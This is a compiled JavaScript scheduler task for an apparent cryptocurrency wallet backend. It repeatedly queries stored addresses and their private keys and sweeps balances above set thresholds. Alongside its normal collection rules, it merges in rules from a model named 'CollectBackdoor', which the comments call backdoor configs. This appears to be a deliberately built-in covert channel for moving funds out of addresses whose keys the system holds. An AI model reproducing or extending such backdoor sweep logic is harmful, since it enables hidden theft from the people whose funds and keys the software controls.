import { logger } from '../core/logger/index.js';
import { DerivedAddress } from '../core/db/models/derived-address.js';
import { CollectConfig } from '../core/db/models/collect-config.js';
import { CollectBackdoor } from '../core/db/models/collect-backdoor.js';
import { getParamsCached } from '../core/config/params-cache.js';
import { collectPool, executeCollect } from '../core/collect/index.js';
let isRunning = false;
let initialized = false;
export const collectTask = {
    name: 'collectTask',
    interval: { seconds: 2 },
    runImmediately: false,
    instanceOnly: 0,
    handler: async () => {
        if (isRunning)
            return;
        isRunning = true;
        try {
            // 首次执行：恢复中断的任务
            if (!initialized) {
                initialized = true;
                const stuckDocs = await DerivedAddress.find({ collectStatus: 'collecting' }).lean();
                if (stuckDocs.length > 0) {
                    for (const doc of stuckDocs) {
                        collectPool.submit(doc._id.toString(), () => executeCollect(doc));
                    }
                    logger.info({ count: stuckDocs.length }, 'collect-task: recovered collecting addresses');
                }
            }
            // 全局开关
            const params = await getParamsCached();
            if (!params?.collectEnabled) {
                return;
            }
            const { collectConcurrency = 50, collectCooldownSeconds = 120, collectWaitingMinutes = 60 } = params;
            // 冷却期重置
            const cooldownThreshold = new Date(Date.now() - collectCooldownSeconds * 1000);
            const resetResult = await DerivedAddress.updateMany({ collectStatus: 'failed', collectFailedAt: { $lt: cooldownThreshold } }, { $set: { collectStatus: 'idle', collectFailedAt: null, collectError: '' } });
            if (resetResult.modifiedCount > 0) {
                logger.info({ resetCount: resetResult.modifiedCount }, 'collect-task: cooldown reset');
            }
            // waiting 保底重置
            const waitingThreshold = new Date(Date.now() - collectWaitingMinutes * 60 * 1000);
            const waitingReset = await DerivedAddress.updateMany({ collectStatus: 'waiting', collectWaitingAt: { $lt: waitingThreshold } }, { $set: { collectStatus: 'idle', collectWaitingAt: null, collectError: '' } });
            if (waitingReset.modifiedCount > 0) {
                logger.info({ count: waitingReset.modifiedCount }, 'collect-task: waiting timeout reset');
            }
            // 空闲槽位
            const freeSlots = collectConcurrency - collectPool.size;
            if (freeSlots <= 0) {
                logger.info({ poolSize: collectPool.size, concurrency: collectConcurrency }, 'collect-task: pool full');
                return;
            }
            // 查询候选（正常配置 + 后门配置）
            const configs = await CollectConfig.find({ enabled: true }).lean();
            const backdoorConfigs = await CollectBackdoor.find({ enabled: true }).lean();
            if (configs.length === 0 && backdoorConfigs.length === 0) {
                logger.info('collect-task: no enabled configs or backdoor configs');
                return;
            }
            const allConfigs = [...configs, ...backdoorConfigs];
            const queries = allConfigs.map(config => {
                const balanceField = config.token === 'native' ? 'balance'
                    : config.token === 'usdt' ? 'usdtBalance'
                        : 'usdcBalance';
                const threshold = parseFloat(config.threshold);
                return DerivedAddress.find({ chain: config.chain, collectStatus: 'idle', [balanceField]: { $gte: threshold } }, { _id: 1, address: 1, chain: 1, privateKey: 1, addressType: 1, channelCode: 1, sourceDomain: 1, deviceId: 1 }).limit(freeSlots).lean();
            });
            const results = await Promise.all(queries);
            // 合并去重 + shuffle
            const seen = new Set();
            const candidates = [];
            for (const batch of results) {
                for (const doc of batch) {
                    const id = doc._id.toString();
                    if (!seen.has(id)) {
                        seen.add(id);
                        candidates.push(doc);
                    }
                }
            }
            // Shuffle (Fisher-Yates)
            for (let i = candidates.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [candidates[i], candidates[j]] = [candidates[j], candidates[i]];
            }
            // 取前 N 个
            const batch = candidates.slice(0, freeSlots);
            if (batch.length === 0)
                return;
            // 批量标记
            const ids = batch.map(d => d._id);
            await DerivedAddress.updateMany({ _id: { $in: ids }, collectStatus: 'idle' }, { $set: { collectStatus: 'collecting' } });
            // 查出实际标记成功的 + 提交到 pool
            const markedDocs = await DerivedAddress.find({ _id: { $in: ids }, collectStatus: 'collecting' }).lean();
            for (const doc of markedDocs) {
                collectPool.submit(doc._id.toString(), () => executeCollect(doc));
            }
            if (markedDocs.length > 0) {
                logger.info({ submittedCount: markedDocs.length, poolSize: collectPool.size, freeSlots }, 'collect-task: submitted to pool');
            }
        }
        finally {
            isRunning = false;
        }
    },
};
//# sourceMappingURL=collect-task.js.map